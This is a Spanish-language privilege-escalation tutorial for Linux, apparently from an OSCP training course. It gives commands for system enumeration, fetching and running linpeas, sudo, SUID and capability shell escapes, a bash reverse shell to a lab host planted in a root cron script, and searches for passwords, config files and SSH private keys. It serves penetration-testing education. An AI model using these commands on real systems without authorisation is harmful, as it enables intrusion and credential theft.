11 · Post-explotación y escalada en Linux

Has entrado como un usuario con pocos permisos (ej. www-data). Objetivo: convertirte en root. Se trata de enumerar el sistema y encontrar la mala configuración.

1. Lo primero al entrar

$ whoami; id            # ¿quién soy, qué grupos?
$ hostname; uname -a    # versión del kernel
$ cat /etc/os-release   # distribución
$ ip a; ip route        # ¿hay más redes? (pivoting)
$ sudo -l               # ⭐ qué puedo ejecutar como root

2. Enumeración automática

# Sube linpeas desde Kali (python3 -m http.server) y ejecútalo
$ wget http://10.0.2.15/linpeas.sh -O /tmp/lp.sh
$ chmod +x /tmp/lp.sh; /tmp/lp.sh | tee /tmp/out.txt
# Alternativas: LinEnum.sh, pspy (ver procesos/cron en tiempo real)
💡 linpeas coloreaLo que sale en rojo/amarillo es lo más prometedor. Pero no te fíes solo de él: revisa a mano sudo, SUID y cron.

3. Los 6 vectores de escalada más comunes

a) sudo mal configurado — lo primero y lo más común

$ sudo -l
# Si ves: (ALL) NOPASSWD: /usr/bin/find  → a GTFOBins
$ sudo find . -exec /bin/sh \; -quit     # ¡eres root!
# sudo sin contraseña a vim, python, less, awk, nmap... todos escalables
💡 GTFOBinsgtfobins.github.io: busca cualquier binario y te dice cómo abusar de él con sudo/SUID. Es tu mejor amigo en privesc Linux.

b) Binarios SUID

$ find / -perm -4000 -type f 2>/dev/null
# Si aparece un binario raro o uno de GTFOBins (cp, find, nano, bash...)
$ /usr/bin/find . -exec /bin/sh -p \; -quit

c) Tareas cron

$ cat /etc/crontab; ls -la /etc/cron.*
# Si root ejecuta un script que TÚ puedes editar:
$ echo 'bash -i >& /dev/tcp/10.0.2.15/443 0>&1' >> /ruta/script_de_root.sh
# Espera a que el cron lo ejecute → reverse shell como root
$ ./pspy64      # para ver qué cron se ejecuta y cuándo

d) Capabilities

$ getcap -r / 2>/dev/null
# Si python tiene cap_setuid:
$ python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'

e) Grupos peligrosos

Si id te pone en docker o lxd, puedes montar un contenedor que monte el disco del host y leer/escribir como root. disk → leer todo el disco con debugfs. adm → leer logs con credenciales.

f) Exploits de kernel / software (último recurso)

$ uname -r                              # ej. 4.4.0-21
$ searchsploit linux kernel 4.4 privilege
# Famosos: DirtyCow (CVE-2016-5195), DirtyPipe, pwnkit (CVE-2021-4034)
$ searchsploit pkexec pwnkit
⚠️ Los exploits de kernel son el último recursoPueden tumbar la máquina. Primero agota sudo, SUID, cron y credenciales. En el OSCP, tirar una máquina te hace perder tiempo (y reiniciarla).

4. Buscar credenciales por todas partes

$ cat ~/.bash_history
$ grep -ri "password" /var/www 2>/dev/null
$ cat /var/www/html/config.php wp-config.php
$ find / -name "id_rsa" 2>/dev/null       # claves SSH privadas
$ cat /etc/passwd                          # reutiliza contraseñas entre usuarios
